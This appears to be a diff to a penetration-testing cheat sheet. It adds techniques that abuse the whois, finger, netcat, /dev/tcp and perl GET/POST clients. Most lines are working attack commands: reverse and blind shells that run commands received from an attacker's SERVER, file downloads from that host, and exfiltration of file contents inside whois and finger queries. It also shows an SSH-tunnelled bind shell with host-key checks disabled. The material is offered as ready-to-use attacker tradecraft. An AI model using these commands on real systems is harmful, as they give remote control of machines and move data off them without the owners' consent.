@@ -12,14 +12,9 @@ NOTE:
 
 * Downloading files
 -----------------------------
-    -: perl-libwww-perl
-
-        [client]$ GET http://SERVER/file.sh > file.out
-        [client]$ echo|POST http://SERVER/path > file.out
-
     -: shell using /dev/tcp
 
-        [server]# nc -vlp 12345 -w 3 < some.file
+        [server]# nc -vlp PORT -w 3 < some.file
         [client]$ exec 3<> /dev/tcp/SERVER/PORT; cat <&3 > /tmp/out.file
 
     -: HTTP GET
@@ -34,7 +29,8 @@ NOTE:
       /usr/bin/GET
       /usr/bin/POST
 
-   -: Commands are executed after ^C exit, command output will be sent to POST SERVER:PORT
+   -: Reverse shell
+      Commands are executed after ^C exit, command output will be sent to POST SERVER:PORT
 
       [server]# nc -vl CMDP // cmd port
         or
@@ -42,6 +38,82 @@ NOTE:
       [server]# nc -vl COUT // cmd output port
 
       [client]$ GET http://SERVER:CMDP | $SHELL | POST http://SERVER:COUT
+
+    -: Download Files
+
+        [client]$ GET http://SERVER/file.sh > file.out
+        [client]$ echo|POST http://SERVER/path > file.out
+
+
+* Whois
+-----------------------------
+
+   -: Reverse shell
+      # Once a client has connected, type a command followed by enter and ^D (to signal the end of each command)
+      [server]# while 1; do nc -l 43; done
+      [client]$ export X=Connected; while 1; do X=`eval $(whois -h SERVER -- "Output: $X")`; sleep 1; done
+
+   -: Blind Shell
+      [server]# nc -vl 43 < my.sh # batch commands
+        or
+      [server]# nc -vl 43 # Commands are executed after hitting ^D
+
+      [client]$ whois -h SERVER bla.com | $SHELL
+
+      # send output of a single command
+      [client]$ whois -h SERVER `id -a`
+
+      # use wildcard `*`, same as executing `ls .`
+      [client]$ whois -h SERVER *
+
+   -: Download files
+
+       - whois port
+       [server]# nc -vl 43 -w 3 < some.file #whois port
+       [client]$ whois -h SERVER bla.com > /tmp/file #whois port
+
+       - Custom port
+       [server]# nc -vl PORT -w 3 < some.file
+       [client]$ whois -h SERVER -p PORT bla.com > /tmp/file
+
+       - Binary file
+       [server]# base64 file | nc -vl PORT -w 3
+       [client]$ whois -h SERVER bla.com | base64 -d > /tmp/file
+
+   -: Upload/Exfiltrate Files
+
+       [server]# nc -vl 43 > /tmp/file
+       [client]$ whois -h SERVER "`cat /path/to/file`"
+
+       - Binary file
+          [server]# nc -vl 43 | tr -d $'\x0d' | base64 -d > /tmp/file
+          [client]$ whois -h SERVER "`base64 /path/to/file`"
+
+
+* Finger
+-----------------------------
+   -: Reverse shell
+     # Once a client has connected, type !command followed by enter and ^D (to signal the end of each command)
+     [server]# while 1; do nc -l 79; done
+     [client]$ while 1; do X=`eval $(finger "$X"@SERVER | sed -e '1,1d' -e 's/^!//')`; sleep 1; done
+
+   -: Blind Shell
+      [server]# nc -vl 79
+       or
+      [server]# nc -vl 79 < cmds.sh # Batch commands
+      [client]$ finger @SERVER | sed 1,1d | sh
+
+   -: Download files
+       [server]# nc -vl 79 < file
+       [client]$ finger @SERVER | sed 1,1d > /tmp/file
+
+       - Binary file
+         [server]# base64 file | nc -vl 79
+         [client]$ finger @SERVER | sed 1,1d | base64 -d > /tmp/file
+
+   -: Upload/Exfiltrate Files (Binary)
+       [server]# nc -vl 79 | base64 -d > ./test.file
+       [client]$ finger "$(base64 /tmp/file)@SERVER"
 
 
 * Using bindshell with SSH Tunnel
@@ -61,7 +133,7 @@ NOTE:
      [client]$ mkfifo /tmp/mypipe; cat /tmp/mypipe| /bin/bash 2>&1|nc -vl 6000 >/tmp/mypipe // Or some other bind shell
      [client]$ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/id_rsa -R 6000:127.0.0.1:6000 root@SERVER_IP
 
-     # Connect to bind shell The connection to 127.0.0.1 on TCP port 6000 is actually forwarded by SSH to the remote machine
+     # Connect to bind shell. Local connections to 127.0.0.1 on TCP port 6000 is actually forwarded by SSH to the remote machine
      # Note exiting the netcat session, the bind shell may exit on the remote machine
      [server]# ncat 127.0.0.1 6000
 
